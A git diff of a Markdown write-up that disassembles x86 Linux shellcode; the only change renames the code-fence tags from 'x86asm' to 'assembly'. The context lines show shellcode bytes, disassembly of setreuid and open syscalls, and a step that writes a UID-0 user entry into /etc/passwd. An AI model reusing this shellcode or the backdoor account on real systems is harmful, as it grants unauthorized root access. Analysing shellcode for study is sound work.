@@ -16,7 +16,7 @@ echo -n "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x7
 
 ## Disassembled Assembly
 
-```x86asm
+```assembly
 00000000  31C9              xor ecx,ecx
 00000002  89CB              mov ebx,ecx
 00000004  6A46              push byte +0x46
@@ -81,7 +81,7 @@ So, in essense this function is getting called with a 0 for both parameters. Thi
 
 The shellcode for this sequence looks like this:
 
-```x86asm
+```assembly
 00000000  31C9              xor ecx,ecx
 00000002  89CB              mov ebx,ecx
 00000004  6A46              push byte +0x46
@@ -107,7 +107,7 @@ Then the syscall is triggered. The return value is then moved from `eax` into `e
 
 The full shellcode for this segment is listed below:
 
-```x86asm
+```assembly
 00000009  6A05              push byte +0x5
 0000000B  58                pop eax             ; 0x5 from stack
     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 5$"
@@ -137,7 +137,7 @@ echo -n "`python2 -c 'print "\x90"*81'`\x59\x8b\x51\xfc\x61\x04\x58\xcd\x80\x6a\
 
 First, the call and string:
 
-```x86asm
+```assembly
 00000026  E826000000        call 0x51               ; call label1 
 
 
@@ -149,7 +149,7 @@ Thus, the string `username:AzydwfoigBTrs:0:0::/:/bin/sh` will be written to `/et
 
 Then the newly disassembled instructions:
 
-```x86asm
+```assembly
 label1:             
 00000051  59                pop ecx             ; ptr to 0x2b (string to write)
 00000052  8B51FC            mov edx,[ecx-0x4]   ; 0x26 = 38 (uses opcode from E826 at offset 0x26)
@@ -166,7 +166,7 @@ label1:
 
 These remaining instructions pop the value on the stack (pointer to the string) into `ecx`, then it moves `[ecx-0x4]` into `edx`. This instruction is interesting. It is using the opcode from `0x2b - 0x4` which is `0x27`. This is the number `0x26` from this call line:
 
-```x86asm
+```assembly
 00000026  E826000000        call 0x51               ; call label1 
 ```
 
@@ -180,7 +180,7 @@ Finally a value of `0x1` is moved into `eax` by pushing it to the stack and popp
 
 Here I have cleaned and commented the code in its entirety:
 
-```x86asm
+```assembly
 00000000  31C9              xor ecx,ecx
 00000002  89CB              mov ebx,ecx
 00000004  6A46              push byte +0x46
